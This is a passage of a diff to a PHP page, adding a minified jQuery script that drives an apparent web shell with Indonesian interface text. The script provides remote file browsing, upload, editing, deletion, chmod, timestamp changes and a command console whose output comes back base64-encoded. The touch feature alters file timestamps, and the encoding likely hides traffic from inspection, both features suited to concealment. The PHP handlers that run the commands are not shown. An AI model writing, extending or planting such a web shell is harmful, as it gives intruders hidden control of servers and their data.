class="mb-0">'+a+"</pre></code>");else{"rqrename"==o||"rqtouch"==o?r.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==o&&t("body").find("#showchmod").modal("hide"),d.modal("hide"),n("Alert",a);var e=t("#fileman").find("a#ffmanager");e[e.length-1].click(function(t){t.stopPropagation()})}})})}),t(document).on("submit","form#rqchdir",function(a){a.preventDefault();var e=t(this),i=e.find('input[name="xpath"]').val();i.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(e.find('button[type="submit"]').prop("disabled",!0),r(i,function(){var t=document.querySelectorAll("#showaksi");t.length>0?o(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),e.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(e){e.preventDefault();var i=t(this),o=i.find('input[name="xdir"]').val();if(o.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==i.find(":selected").val()){var r=t("#modalshowaksi"),d=i.find('input[name="xpath"]').val();r.modal("show"),r.find(".modal-title").text("FileName: "+o),r.find(".modal-body").html('<form method="post" action="?act=path&dir='+d+"&entry="+o+'&opt=newfile" id="rqnewfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control" style="white-space:pre;" rows="20" placeholder="tulis seperlunya..."></textarea></div><center><button class="btn btn-success text-center" type="submit">Simpan</button></center></form>')}else i.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:i.attr("action"),data:i.serialize(),beforeSend:function(){t(a).insertAfter(i)},success:function(a){i.next("span").remove(),i.find('button[type="submit"]').prop("disabled",!1),n("Alert",a);var e=t("#fileman").find("a#ffmanager");e[e.length-1].click(function(t){t.stopPropagation()}),i.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(a){a.preventDefault();var e=t(this),i=e.find('input[name="xfile[]"]').prop("files");if(i&&i.length<=0||i.size<1)n("Error","File kosong, gak ada isinya!");else{var o=new FormData(this);e.find('button[type="submit"]').prop("disabled",!0),o.append("xfile",i),t.ajax({type:"post",url:e.attr("action"),data:o,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){e.next("span").remove()},success:function(a){e[0].reset(),e.next("span").remove(),e.find('button[type="submit"]').prop("disabled",!1),n("Alert",a);var i=t("#fileman").find("a#ffmanager");i[i.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(e){e.preventDefault();var n=t(this);n.parents().find("#hasilcommand").show(),n.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:n.attr("action"),data:n.serialize(),dataType:"json",beforeSend:function(){n.parents().find("#hasilcommand").html(a)},success:function(t){var a=JSON.parse(JSON.stringify(t));n.find('input[name="xpath"]').val(a.path),n.find('button[type="submit"]').prop("disabled",!1),n.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a.stdout+"</div></div>")},error:function(t,a,e){n.find('button[type="submit"]').prop("disabled",!1),n.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a+": "+e+"</div></div>")}}).done(function(a){var e=JSON.parse(JSON.stringify(a));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").find('input[name="xpath"]').val(e.path),t.each(t("body").find("button[data-tempdir]"),function(a,n){t(n).attr("data-tempdir",e.path)}),t.each(t("body").find("a[data-path]"),function(a,n){t(n).attr("data-path",e.path)})})})}(jQuery);</script>
+		<script>!function(t){var a='<span class="bg-transparent"><?php echo fType('loader','1.5em');?>Tunggu bentar...</span>';let e={bs64ToBit:function(t){let a=atob(t);return Uint8Array.from(a,t=>t.codePointAt(0))},btTobs64:function(t){let a=String.fromCodePoint(...t);return btoa(a)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(a){return!1}},encode:function(t){return e.isWellFormed(t)?e.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return e.isWellFormed(t)?new TextDecoder().decode(e.bs64ToBit(t)):""}},n=(a,e)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="10000"><div class="toast-header"><img src="<?php echo fType('logo');?>" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+a+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+e+"</div></div>"),t(".toast").toast("show")};function o(e,o,i,r){var d=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+o+"&entry="+i+"&opt="+e,beforeSend:function(){d.html(a)}}).done(function(t){d.html(""),r(t)}).fail(function(t,a,e){n("Error",t.status),d.html("error_code: "+t.status)})}function i(a){for(var e=0;e<a.length;e++)a[e].addEventListener("change",function(a){var e=t("option:selected",this)[0],n=e.value,i=t("#modalshowaksi"),r="",d="",l=e.attributes["data-xtype"],s=e.attributes["data-xname"],m=e.attributes["data-xpath"],u=a.currentTarget;if(n.length>0){switch(n){case"rename":d="Rename "+l.value.toUpperCase(),r='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+l.value+'"/><input type="hidden" name="xpath" value="'+m.value+'"/><div class="form-group row"><label for="oname" class="col-sm-2 col-form-label">Name</label><div class="col-sm-10"><input type="text" class="form-control border-success" id="oname" name="oname" readonly="readonly" value="'+s.value+'"/></div></div><div class="form-group row"><label for="xname" class="col-sm-2 col-form-label">Rename</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+s.value+'"/><div class="input-group-append"><button class="btn btn-outline-success" type="submit">GO</button></div></div></div></div></form>';break;case"touch":d="Touch "+l.value.toUpperCase()+" ("+s.value+")",r='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+l.value+'"/><input type="hidden" name="xpath" value="'+m.value+'"/><input type="hidden" name="xname" value="'+s.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" class="form-control border-success" id="xtime" name="xtime" value="'+e.attributes["data-xtime"].value+'"/><div class="input-group-append"><button class="btn btn-outline-success" type="submit">GO</button></div></div></div></div></form>'}"download"==n?window.open("?act=path&dir="+m.value+"&entry="+s.value+"&opt="+n,"_blank"):"del"==n||"zip"==n||"unzip"==n?(i.modal("show"),i.find(".modal-title").html(n+" /"+s.value),i.find(".modal-body").html('<form method="post" action="?act='+n+'" id="rq'+n+'" class="text-center"><input type="hidden" name="xtype" value="'+l.value+'"/><input type="hidden" name="xname" value="'+s.value+'"/><input type="hidden" name="xpath" value="'+m.value+'"/><div class="alert alert-info mx-n3 mt-n3 rounded-0">Klik proses utk melanjutkan!!</div><button class="btn btn-outline-success" type="submit">Proses!</button></form>'),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").html("null"),u.value=""})):"edit"==n?(i.modal("show"),i.find(".modal-body").addClass("pt-0 px-0"),i.find(".modal-title").html("Edit "+l.value.toUpperCase()+": /"+s.value),o("view",m.value,s.value,function(t){var a='<form method="post" action="?act=path&dir='+m.value+"&entry="+s.value+'&opt=edit" id="rqeditfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control rounded-0" style="white-space:pre;" rows="20">'+t+'</textarea></div><center><button class="btn btn-outline-success text-center" type="submit">Simpan</button></center></form>';i.find(".modal-body").html(a)}),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").removeClass("pt-0 px-0").html("null"),u.value=""})):"view"==n?(i.modal("show"),i.find(".modal-title").html("View "+l.value.toUpperCase()+": /"+s.value),o("view",m.value,s.value,function(t){i.find(".modal-body").attr("style","background:#dfdfdf;").addClass("rounded-0").html('<code><pre class="mb-0">'+t+"</pre></code>")}),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").attr("style","").removeClass("rounded-0").html("null"),u.value=""})):(i.modal("show"),i.find(".modal-title").html(d),i.find(".modal-body").html(r),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").html("null"),u.value=""}))}else i.modal("show"),i.find(".modal-title").html("View null"),o("view",m.value,s.value,function(t){i.find(".modal-body").attr("style","background:#dfdfdf;").html("<code>null</code>")}),i.on("hidden.bs.modal",function(t){i.find(".modal-title").html("unknown"),i.find(".modal-body").attr("style","").html("null"),u.value=""})},!1)}function r(o,i){t.ajax({type:"get",url:"?act=path&dir="+o,timeout:5e3,beforeSend:function(){t("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(a,n,r){t("#fileman").html(e.decode(a)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),i(a)}).fail(function(a,e,i){t("#fileman").html(e+", response code: "+a.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("form#rqcmd").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),n("Error",e+", response code: "+a.status)})}t(document).on("click","a#chdrive",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(a){t("body").find("#fileman").html(e.decode(a)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd").find('input[name="xpath"]').val(o),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(a){a.preventDefault();var e=t(a.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+e+'"></input>							<div class="input-group-append">								<button class="btn btn-outline-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(a){t("body").find("#fileman").html(e.decode(a)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd").find('input[name="xpath"]').val(o),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(a){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(a){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(a){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(a){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(e){t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t("#nav-info").find("#showinfo").html(a)}}).done(function(a){try{var e=JSON.parse(JSON.stringify(a)),n=t.map(e,function(t,a){return[t]});t("#nav-info").find("#showinfo").html(n.join(""))}catch(o){t("#nav-info").find("#showinfo").html("Error: Gagal menganalisa server!")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(a){a.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(a){a.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(a){var e=t(a.relatedTarget),n=t(this).find(".modal-body"),o=e.attr("data-xtype"),i=e.attr("data-xname"),r=e.attr("data-xpath"),d=e.attr("data-xperm");n.find('input[name="xtype"]').val(o),n.find('input[name="xname"]').val(i),n.find('input[name="xpath"]').val(r),n.find('input[name="xperm"]').val(d),n.find('input[id="xname"]').val(i),n.find('label[for="xname"]').text(o.toUpperCase())}),t.each(["rqdel","rqzip","rqunzip","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile"],function(o,i){t(document).on("submit","form#"+i,function(o){o.preventDefault();var r=t(this),d=t("#modalshowaksi");if(r.find('button[type="submit"]').prop("disabled",!0),"rqrename"==i||"rqtouch"==i)r.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==i||"rqnewfile"==i)var l=e.encode(r.find('textarea[name="xdata"]').val());else if("rqreadfile"==i){var s=r.find('input[name="xpath"]').val();s.length<1?n("Opss!","Isi dulu nama filenya pak!"):(d.modal("show"),d.find(".modal-title").html("View FILE: "+s))}t.ajax({type:"post",url:r.attr("action"),data:"rqeditfile"==i||"rqnewfile"==i?{xdata:l}:r.serialize(),beforeSend:function(){t(a).insertAfter(r)}}).done(function(a){if(r.next("span").remove(),r.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==i)d.find(".modal-body").attr("style","background:#dfdfdf;").html('<code><pre class="mb-0">'+a+"</pre></code>");else{"rqrename"==i||"rqtouch"==i?r.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==i&&t("body").find("#showchmod").modal("hide"),d.modal("hide"),n("Alert",a);var e=t("#fileman").find("a#ffmanager");e[e.length-1].click(function(t){t.stopPropagation()})}})})}),t(document).on("submit","form#rqchdir",function(a){a.preventDefault();var e=t(this),o=e.find('input[name="xpath"]').val();o.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(e.find('button[type="submit"]').prop("disabled",!0),r(o,function(){var t=document.querySelectorAll("#showaksi");t.length>0?i(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),e.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(e){e.preventDefault();var o=t(this),i=o.find('input[name="xdir"]').val();if(i.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==o.find(":selected").val()){var r=t("#modalshowaksi"),d=o.find('input[name="xpath"]').val();r.modal("show"),r.find(".modal-title").text("FileName: "+i),r.find(".modal-body").html('<form method="post" action="?act=path&dir='+d+"&entry="+i+'&opt=newfile" id="rqnewfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control" style="white-space:pre;" rows="20" placeholder="tulis seperlunya..."></textarea></div><center><button class="btn btn-success text-center" type="submit">Simpan</button></center></form>')}else o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(a).insertAfter(o)},success:function(a){o.next("span").remove(),o.find('button[type="submit"]').prop("disabled",!1),n("Alert",a);var e=t("#fileman").find("a#ffmanager");e[e.length-1].click(function(t){t.stopPropagation()}),o.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(a){a.preventDefault();var e=t(this),o=e.find('input[name="xfile[]"]').prop("files");if(o&&o.length<=0||o.size<1)n("Error","File kosong, gak ada isinya!");else{var i=new FormData(this);e.find('button[type="submit"]').prop("disabled",!0),i.append("xfile",o),t.ajax({type:"post",url:e.attr("action"),data:i,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){e.next("span").remove()},success:function(a){e[0].reset(),e.next("span").remove(),e.find('button[type="submit"]').prop("disabled",!1),n("Alert",a);var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(n){n.preventDefault();var o=t(this);o.parents().find("#hasilcommand").show(),o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),dataType:"json",beforeSend:function(){o.parents().find("#hasilcommand").html(a)},success:function(t){var a=JSON.parse(JSON.stringify(t));o.find('input[name="xpath"]').val(e.decode(a.path)),o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+e.decode(a.stdout)+"</div></div>")},error:function(t,a,e){o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a+": "+e+"</div></div>")}}).done(function(a){var n=JSON.parse(JSON.stringify(a));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").find('input[name="xpath"]').val(e.decode(n.path)),t.each(t("button[data-tempdir]"),function(a,o){t(o).attr("data-tempdir",e.decode(n.path))}),t.each(t("a#fxmanager"),function(a,o){t(o).attr("data-path",e.decode(n.path))})})})}(jQuery);</script>
 	</body>
 </html>
 <?php }?>
